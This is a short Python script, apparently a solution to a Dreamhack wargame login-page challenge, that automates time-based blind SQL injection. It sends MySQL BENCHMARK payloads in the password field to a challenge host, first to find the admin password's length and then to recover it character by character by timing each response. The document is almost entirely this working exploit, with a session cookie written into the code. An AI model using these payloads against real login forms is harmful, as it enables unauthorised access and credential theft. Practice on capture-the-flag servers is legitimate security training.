# Dreamhack Login Page 문제 (time based sql injection)

import requests
import time
from tqdm import tqdm
url = "http://host3.dreamhack.games:9138/login"
cookies = {'session': 'eyJpZCI6eyIgYiI6IlQ5ODR5NU44M1Y3YUtnSlA4NFBlSkE9PSJ9LCJ0cmllcyI6MH0.ZH8gTg.E5TQQLJkWlDNrdu0hTlejk75DQo'}


def get_len():
    for i in tqdm(range(1, 40)):
        payload = {'username': "admin",
                   'password': f"' or username='admin' and if(length(password)={i}, BENCHMARK(15000000,md5('a')),0)-- -"}
        print(payload)
        start = time.time()
        r = requests.post(url, data=payload, cookies=cookies)
        end = time.time()
        if end - start > 2:
            print(f"password length: {i}")
            break
    return i


def find_pw(passwd_len):
    password = ''
    for i in tqdm(range(1, passwd_len+1)):
        for k in range(1, 126):
            payload = {'username': "admin",
                       'password': f"' or username='admin' and if(ord(substr(password,{i},1))={k}, BENCHMARK(15000000,md5('a')),0)-- -"}
            start = time.time()
            r = requests.post(url, data=payload, cookies=cookies)
            end = time.time()
            if end - start > 2:
                print(f"password: " + chr(k))
                password += chr(k)
                break
    return password


def exploit():
    passwd_len = get_len()
    password = find_pw(passwd_len)
    print(password)


exploit()
